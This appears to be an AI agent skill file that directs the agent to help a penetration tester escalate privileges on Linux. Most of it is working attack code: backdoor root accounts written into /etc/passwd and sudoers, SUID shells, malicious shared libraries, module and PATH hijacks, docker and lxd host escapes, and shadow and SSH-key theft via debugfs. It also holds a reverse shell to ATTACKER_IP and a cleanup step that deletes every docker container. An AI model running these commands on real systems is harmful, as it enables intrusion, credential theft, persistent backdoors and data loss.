---
name: linux-file-path-abuse
description: >
  Exploit writable critical files, NFS misconfigurations, shared library
  hijacking, and privileged group membership (docker, lxd, disk, adm, video,
  staff) for Linux privilege escalation. Use when a user belongs to a
  privileged group or has write access to sensitive files or paths.
keywords:
  - writable passwd
  - nfs privesc
  - no_root_squash
  - library hijacking
  - ld.so.conf
  - rpath abuse
  - docker group escape
  - docker group privilege escalation
  - lxd group privesc
  - lxd group privilege escalation
  - lxc group
  - disk group debugfs
  - privileged group membership
  - path hijack
  - symlink attack
  - profile injection
  - writable shadow
  - ldconfig
tools:
  - gcc
  - readelf
  - ldd
  - strace
  - docker
  - lxc
  - debugfs
  - showmount
  - ldconfig
opsec: medium
---

# Linux File, Path, and Group-Based Privilege Escalation

You are helping a penetration tester exploit writable files, filesystem misconfigurations,
shared library loading, and privileged group membership for privilege escalation. All
testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[linux-file-path-abuse] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on Linux target
- At least one of: writable critical file, NFS mount, missing shared library, privileged
  group membership, writable PATH directory, or writable profile script
- gcc (for shared library payloads and NFS SUID binaries — can cross-compile on attacker)

## Step 1: Assess Available Vectors

Determine which file/path/group vectors are available. If coming from **linux-discovery**,
the routing should specify the vector. Otherwise, enumerate:

```bash
# Writable critical files
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null
test -w /etc/passwd && echo "WRITABLE: /etc/passwd"
test -w /etc/shadow && echo "WRITABLE: /etc/shadow"
test -w /etc/sudoers && echo "WRITABLE: /etc/sudoers"

# NFS exports
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
mount | grep nfs

# Group membership
id
groups

# Writable PATH directories
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE PATH: $d"; done

# Library loading
cat /etc/ld.so.conf 2>/dev/null
ls -la /etc/ld.so.conf.d/ 2>/dev/null

# Profile scripts
ls -la ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null
ls -la /etc/profile /etc/profile.d/ 2>/dev/null
ls -la /root/.bashrc /root/.profile 2>/dev/null
```

**Decision tree** — go to the first matching step:

| Finding | Go to |
|---------|-------|
| Writable /etc/passwd | Step 2 |
| Writable /etc/shadow | Step 2 |
| Writable /etc/sudoers or /etc/sudoers.d/ | Step 2 |
| NFS no_root_squash | Step 3 |
| docker group | Step 4 |
| lxd/lxc group | Step 5 |
| disk group | Step 6 |
| Missing .so on SUID binary | Step 7 |
| Writable ld.so.conf or ld.so.conf.d/ | Step 7 |
| RPATH/RUNPATH with writable dir | Step 7 |
| Writable PATH directory + root script using relative binary | Step 8 |
| Writable profile scripts (.bashrc, /etc/profile.d/) | Step 9 |
| Writable SSH authorized_keys for root | Step 2 |

## Step 2: Writable Critical Files

### /etc/passwd — Add UID 0 User

```bash
# Check current format
head -3 /etc/passwd

# Generate password hash (pick one)
openssl passwd -1 "password123"          # MD5 ($1$)
openssl passwd -6 "password123"          # SHA-512 ($6$) — preferred
# Or passwordless — just set 'x' and rely on su without auth (some systems)

# Add backdoor root user
echo 'backdoor:$6$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to new user
su backdoor
# Enter: password123

# Verify
id
```

**Alternative — modify existing user to UID 0:**

```bash
# Change your user's UID to 0 (destructive — breaks your normal account)
sed -i 's/^youruser:x:1000:1000:/youruser:x:0:0:/' /etc/passwd
su youruser
```

### /etc/shadow — Replace Root Hash

```bash
# Generate new hash
openssl passwd -6 "newrootpass"

# Replace root's hash (backup first)
# Format: root:$6$salt$hash:days_since_epoch:min:max:warn:inactive:expire:
sed -i "s|^root:[^:]*:|root:\$6\$salt\$HASH_HERE:|" /etc/shadow

su root
# Enter: newrootpass
```

### /etc/sudoers — Grant NOPASSWD

```bash
# IMPORTANT: invalid sudoers breaks sudo for everyone — validate syntax
# Add NOPASSWD entry
echo "youruser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Validate (if visudo available)
visudo -c

# Use it
sudo su
```

**Writable /etc/sudoers.d/ directory:**

```bash
echo "youruser ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/privesc
chmod 440 /etc/sudoers.d/privesc
sudo su
```

### SSH Authorized Keys

```bash
# Generate keypair on attacker (if needed)
ssh-keygen -t ed25519 -f /tmp/privesc_key -N ""

# Write to root's authorized_keys
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA...key... privesc" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# Connect
ssh -i /tmp/privesc_key root@localhost
```

**OPSEC notes:**
- `/etc/passwd` changes visible to all users immediately
- Invalid `/etc/sudoers` syntax breaks sudo for entire system
- SSH key addition logged in auth.log when used
- File modification timestamps updated — check with `stat`

After success → report finding, proceed to **Step 10: Escalation and Routing**.

## Step 3: NFS no_root_squash

NFS exports with `no_root_squash` allow root-privileged operations from the NFS client.
The attacker mounts the share on a machine where they have root, creates a SUID binary,
then executes it from the low-privilege account on the target.

### Enumerate

```bash
# On target — find NFS exports
cat /etc/exports 2>/dev/null | grep -v "^#"
# Look for: no_root_squash (critical), insecure, no_subtree_check

# From attacker — enumerate target NFS
showmount -e TARGET_IP

# Check mounted shares on target
mount | grep nfs
df -h | grep nfs

# Check mount options (nosuid blocks this attack)
mount | grep nfs | grep -i "nosuid"
```

### Exploit — SUID Binary via NFS

**On attacker machine (as root):**

```bash
# Mount the NFS share
mkdir -p /tmp/nfs
mount -t nfs TARGET_IP:/exported_share /tmp/nfs

# Create SUID shell
cat > /tmp/nfs/suid_shell.c << 'PAYLOAD'
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
PAYLOAD

gcc -o /tmp/nfs/suid_shell /tmp/nfs/suid_shell.c
chmod 4755 /tmp/nfs/suid_shell
rm /tmp/nfs/suid_shell.c
```

**On target (as low-privilege user):**

```bash
# Execute the SUID binary
/path/to/nfs/mount/suid_shell

# Verify
id
whoami
```

**Alternative — copy bash with SUID:**

```bash
# On attacker (as root, on NFS mount)
cp /bin/bash /tmp/nfs/rootbash
chmod 4755 /tmp/nfs/rootbash

# On target
/path/to/nfs/mount/rootbash -p
```

**Troubleshooting:**
- `mount: permission denied` → target may require `-o vers=3` or specific NFS version
- SUID bit not preserved → share mounted with `nosuid` option (attack blocked)
- Binary won't execute → share mounted with `noexec` (try script-based approach instead)
- `Operation not permitted` on chmod → NFS has `root_squash` (default — not exploitable)

After success → report finding, proceed to **Step 10**.

## Step 4: Docker Group Escape

Docker group membership allows launching containers. Mount the host filesystem into a
container and modify critical files as root (container root = host root with -v).

### Enumerate

```bash
# Confirm docker group and daemon access
groups | grep docker
docker ps 2>/dev/null
docker images 2>/dev/null

# Check if docker.sock is accessible
ls -la /var/run/docker.sock
```

### Exploit — Mount Host Filesystem

```bash
# Option 1: Interactive shell with host mounted
docker run --rm -it -v /:/mnt alpine chroot /mnt bash

# Option 2: Create SUID bash on host
docker run --rm -v /:/mnt alpine sh -c "cp /mnt/bin/bash /mnt/tmp/rootbash && chmod 4755 /mnt/tmp/rootbash"
/tmp/rootbash -p

# Option 3: Add backdoor user to host /etc/passwd
docker run --rm -v /:/mnt alpine sh -c "echo 'backdoor:\$6\$salt\$hash:0:0::/root:/bin/bash' >> /mnt/etc/passwd"
su backdoor

# Option 4: Add SSH key to root
docker run --rm -v /:/mnt alpine sh -c "mkdir -p /mnt/root/.ssh && echo 'ssh-ed25519 KEY' >> /mnt/root/.ssh/authorized_keys"
```

**If no images are available:**

```bash
# Pull minimal image
docker pull alpine

# Or use --privileged for full host access
docker run --rm -it --privileged --pid=host alpine nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Docker socket via API (if docker CLI unavailable):**

```bash
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container via API
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cp /host/bin/bash /host/tmp/rootbash && chmod 4755 /host/tmp/rootbash"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create

# Start it (use the container ID from response)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/CONTAINER_ID/start
```

**OPSEC notes:**
- Container creation logged by docker daemon (`/var/log/docker.log`, journalctl)
- Image pull creates network activity
- Mount operations visible in process listing

After success → report finding, proceed to **Step 10**.

## Step 5: LXD/LXC Group Escape

LXD/LXC group membership allows container management. Create a privileged container with
the host filesystem mounted, then modify files as root inside it.

### Enumerate

```bash
groups | grep -E "lxd|lxc"
lxc list 2>/dev/null
lxc image list 2>/dev/null
```

### Exploit — Privileged Container with Host Mount

```bash
# Initialize LXD if not already done (may prompt — use defaults)
lxd init --auto 2>/dev/null

# Import image if none available
# Option A: from local image (faster, no network)
# Build on attacker: lxc image export alpine /tmp/alpine.tar.gz
# Transfer to target, then:
lxc image import /tmp/alpine.tar.gz --alias privesc-img

# Option B: from remote (requires network)
lxc image copy images:alpine/3.18 local: --alias privesc-img

# Create privileged container
lxc init privesc-img privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/host recursive=true
lxc start privesc

# Get root shell inside container
lxc exec privesc -- /bin/sh

# Inside container — modify host
echo 'backdoor:$6$salt$hash:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
# Or create SUID bash
cp /mnt/host/bin/bash /mnt/host/tmp/rootbash
chmod 4755 /mnt/host/tmp/rootbash

# Exit container, use from host
exit
/tmp/rootbash -p
```

**Cleanup:**

```bash
lxc stop privesc
lxc delete privesc
lxc image delete privesc-img
```

**Troubleshooting:**
- `Error: not found` on lxd init → LXD not installed, only LXC available; use `lxc-create`
  and `lxc-attach` instead
- Storage backend errors → try `lxd init` with `dir` backend
- Image import fails → use `lxc-create -t download` for LXC (non-LXD)

After success → report finding, proceed to **Step 10**.

## Step 6: Disk Group — Raw Device Access

The `disk` group grants read access to block devices (`/dev/sda*`). Use `debugfs` to
extract sensitive files without normal file permissions.

### Enumerate

```bash
groups | grep disk
ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
lsblk

# Identify root filesystem device
df / | tail -1 | awk '{print $1}'
```

### Exploit — Read Sensitive Files via debugfs

```bash
# Extract /etc/shadow
debugfs /dev/sda1 -R 'cat /etc/shadow' 2>/dev/null

# Extract SSH private keys
debugfs /dev/sda1 -R 'cat /root/.ssh/id_rsa' 2>/dev/null

# Extract other sensitive files
debugfs /dev/sda1 -R 'cat /etc/sudoers' 2>/dev/null
debugfs /dev/sda1 -R 'cat /root/.bash_history' 2>/dev/null
```

**Save extracted hashes for cracking:**

```bash
# Save shadow content to evidence
debugfs /dev/sda1 -R 'cat /etc/shadow' 2>/dev/null > engagement/evidence/shadow-hashes.txt
```

**Do NOT crack hashes in this skill.** Save the shadow hashes to
`engagement/evidence/` and return to the orchestrator with the hash file path,
hash type (SHA-512 crypt / hashcat mode 1800, or MD5 crypt / mode 500), and a
routing recommendation to **credential-cracking**.

**Alternative — dd full filesystem:**

```bash
# Copy entire partition (large — use only if needed)
dd if=/dev/sda1 bs=4M | gzip > /tmp/sda1.img.gz

# Mount on attacker
gunzip sda1.img.gz
mount -o loop sda1.img /mnt/extracted
cat /mnt/extracted/etc/shadow
```

**Write access (if disk group has write):**

```bash
# WARNING: writing raw blocks can corrupt filesystem
# Use debugfs write mode only if confident
debugfs -w /dev/sda1
# debugfs: write /tmp/backdoor /usr/local/bin/backdoor
```

**Troubleshooting:**
- `debugfs: Bad magic number` → not ext2/3/4 filesystem; try `xfs_db` for XFS
- Permission denied on device → disk group may not have read on this device
- Only read access → extract credentials and crack, or look for SSH keys

After success → report finding, proceed to **Step 10**.

## Step 7: Shared Library Hijacking

Exploit the dynamic linker's library search order to inject malicious shared objects that
execute when a privileged binary loads them.

### 7a: Missing Shared Object on SUID/Privileged Binary

```bash
# Find SUID binaries with missing libraries
find / -perm -4000 -type f 2>/dev/null | while read bin; do
  ldd "$bin" 2>/dev/null | grep "not found" && echo "  ^ from: $bin"
done

# Or use strace on specific binary
strace /usr/bin/target_suid 2>&1 | grep -E "open(at)?\(.*\.so" | grep -i "no such"
```

**Exploit — inject missing .so:**

```bash
cat > /tmp/privesc.c << 'PAYLOAD'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor runs when library is loaded
void __attribute__((constructor)) init(void) {
    setuid(0);
    setgid(0);
    unsetenv("LD_PRELOAD");
    system("/bin/bash -p");
}
PAYLOAD

gcc -shared -fPIC -o /tmp/libmissing.so /tmp/privesc.c

# Place in the directory the binary searches
# (check strace output for exact path)
cp /tmp/libmissing.so /path/where/binary/looks/libmissing.so

# Execute the SUID binary — it loads our library
/usr/bin/target_suid
```

### 7b: RPATH/RUNPATH with Writable Directory

```bash
# Check RPATH/RUNPATH on SUID binaries
find / -perm -4000 -type f 2>/dev/null | while read bin; do
  rpath=$(readelf -d "$bin" 2>/dev/null | grep -iE "rpath|runpath" | awk '{print $NF}' | tr -d '[]')
  [ -n "$rpath" ] && echo "$bin → $rpath"
done

# Check if RPATH directory is writable
# If RPATH=./lib or /opt/app/lib and writable:
ls -ld /opt/app/lib 2>/dev/null
```

**Exploit — inject library in RPATH directory:**

```bash
# Identify which library to hijack
ldd /usr/bin/target_suid | head -5
# Pick a library that's loaded from the RPATH directory

# Create malicious version (same filename)
gcc -shared -fPIC -o /writable/rpath/dir/libtarget.so /tmp/privesc.c

# Execute SUID binary
/usr/bin/target_suid
```

### 7c: Writable /etc/ld.so.conf or /etc/ld.so.conf.d/

```bash
# Check permissions
ls -la /etc/ld.so.conf /etc/ld.so.conf.d/ 2>/dev/null

# If writable, add controlled directory to search path
echo "/tmp/privlibs" > /etc/ld.so.conf.d/privesc.conf

# Create directory with malicious library
mkdir -p /tmp/privlibs

# Find which library a root-executed binary loads
ldd /usr/bin/target_binary | head -3
# Create malicious version of that library
gcc -shared -fPIC -o /tmp/privlibs/libtarget.so.1 /tmp/privesc.c

# Refresh cache (requires ldconfig execution — may need to wait for cron/reboot)
ldconfig 2>/dev/null

# When target binary runs as root, our library loads first
```

### 7d: Python/Perl Library Path Hijacking

When a root-executed script imports modules, hijack the import path:

**Python:**

```bash
# Find Python scripts run as root (from pspy or cron)
# Check if import path includes writable directories
python3 -c "import sys; print('\n'.join(sys.path))"

# Create malicious module in first writable path
cat > /tmp/os.py << 'PAYLOAD'
import subprocess
import importlib
subprocess.call(["/bin/bash", "-p"])
# Re-import real os to avoid breaking the script
PAYLOAD

# If script runs with PYTHONPATH including /tmp, or /tmp is in sys.path:
PYTHONPATH=/tmp /usr/bin/root_script.py
```

**Perl:**

```bash
cat > /tmp/strict.pm << 'PAYLOAD'
BEGIN {
    system("/bin/bash -p");
}
1;
PAYLOAD

PERL5LIB=/tmp /usr/bin/root_script.pl
```

**OPSEC notes:**
- Malicious .so files are obvious artifacts
- ldconfig modifications change system-wide library resolution
- Broken libraries can crash system services
- Constructor functions leave process traces

After success → report finding, proceed to **Step 10**.

## Step 8: PATH Hijacking in Scripts and Services

When a privileged script or service calls a binary without a full path, inject a malicious
binary earlier in PATH.

### Identify the Target

```bash
# Find scripts that use relative binary names (from pspy, cron, or service files)
# Example: cron script calls "tar" not "/usr/bin/tar"

# Check which directories are in PATH for the privileged process
# pspy output shows: CMD: UID=0 ... /bin/sh /opt/scripts/backup.sh
cat /opt/scripts/backup.sh | grep -v "^#" | grep -oE "^[a-z]+" | sort -u

# Find writable directories in standard PATH locations
for d in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin; do
  [ -w "$d" ] && echo "WRITABLE: $d"
done
```

### Exploit

```bash
# If script calls "tar" without full path, and /usr/local/bin is writable:
cat > /usr/local/bin/tar << 'PAYLOAD'
#!/bin/bash
# Payload — create SUID bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
# Run real tar to avoid breaking the script
/usr/bin/tar "$@"
PAYLOAD
chmod 755 /usr/local/bin/tar

# Wait for privileged script to execute (cron, service restart, etc.)
# Then:
/tmp/rootbash -p
```

**Writable PATH + cron interaction:**

```bash
# If cron script sets PATH=/usr/local/bin:/usr/bin:/bin and /usr/local/bin is writable:
# Same technique — place payload binary in /usr/local/bin
```

**Staff group exploitation:**

```bash
# staff group typically has write to /usr/local/
groups | grep staff
ls -ld /usr/local/bin /usr/local/lib

# Place binary in /usr/local/bin — will be found before /usr/bin in most PATH configs
```

After success → report finding, proceed to **Step 10**.

## Step 9: Profile Script Injection

Inject commands into shell profile scripts that execute when a privileged user logs in.
This is a **waiting attack** — payload fires when the target user next opens an
interactive shell.

### Identify Writable Profiles

```bash
# User-level profiles
ls -la ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc 2>/dev/null

# System-level profiles
ls -la /etc/profile /etc/bash.bashrc 2>/dev/null
ls -la /etc/profile.d/ 2>/dev/null

# Root profiles (if readable to check, writable to exploit)
ls -la /root/.bashrc /root/.profile 2>/dev/null
```

### Exploit

**Inject SUID creation into root's profile:**

```bash
# If /root/.bashrc is writable
echo 'cp /bin/bash /tmp/rootbash 2>/dev/null; chmod 4755 /tmp/rootbash 2>/dev/null' >> /root/.bashrc
# Wait for root to log in (SSH, su, etc.), then:
/tmp/rootbash -p
```

**System-wide profile injection:**

```bash
# If /etc/profile.d/ is writable — affects ALL users on login
cat > /etc/profile.d/zzz-privesc.sh << 'PAYLOAD'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    cp /bin/bash /tmp/rootbash 2>/dev/null
    chmod 4755 /tmp/rootbash 2>/dev/null
fi
PAYLOAD
chmod 644 /etc/profile.d/zzz-privesc.sh
```

**Reverse shell variant (if SUID approach won't work):**

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &' >> /root/.bashrc
# Set up listener: nc -lvnp PORT
```

**OPSEC notes:**
- Profile modification is persistent — survives reboots
- Obvious on inspection (`cat ~/.bashrc`)
- Triggers only on interactive login (not scripts, not cron)
- System-wide profiles affect all users — more likely to be noticed
- Use `zzz-` prefix to load last (after other profile.d scripts)

After success → report finding, proceed to **Step 10**.

## Step 10: Escalation and Routing

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| `Permission denied` writing to /etc/passwd | Not actually writable | Re-check with `ls -la`, look for ACLs with `getfacl` |
| NFS SUID bit not preserved | `nosuid` mount option | Attack blocked — try file write approach instead |
| Docker `permission denied` | Docker daemon not running | Check `systemctl status docker`, look for docker.sock |
| LXD `Error: not found` | LXD not initialized | Run `lxd init --auto` first |
| debugfs shows nothing | Wrong device or not ext filesystem | Check `lsblk`, try `xfs_db` for XFS |
| Library hijack crashes binary | Wrong .so name or ABI mismatch | Check exact expected name with `ldd`, match soname |
| PATH hijack not triggering | Script uses full path | Check script source; full paths (`/usr/bin/tar`) aren't hijackable |
| Profile injection not firing | Target uses non-interactive shell | Only works on login shells; try cron/service approach instead |
| `Operation not permitted` on chmod 4755 | Filesystem mounted nosuid | Check `mount | grep nosuid`; use different filesystem |

## Cleanup Reminders

Remind the user to clean up after testing:

```bash
# Remove backdoor users from /etc/passwd
sed -i '/^backdoor:/d' /etc/passwd

# Remove SUID shells
rm -f /tmp/rootbash /tmp/suid_shell

# Remove injected sudoers entries
rm -f /etc/sudoers.d/privesc

# Remove profile injections
# Edit ~/.bashrc or /etc/profile.d/ to remove injected lines

# Remove NFS artifacts
rm -f /path/to/nfs/suid_shell

# Remove containers
docker rm -f $(docker ps -aq) 2>/dev/null
lxc stop privesc && lxc delete privesc 2>/dev/null

# Remove library hijacks
rm -f /tmp/privlibs/*.so /tmp/privesc.c /tmp/libmissing.so

# Remove PATH hijack binaries
rm -f /usr/local/bin/tar  # or whatever was hijacked
```
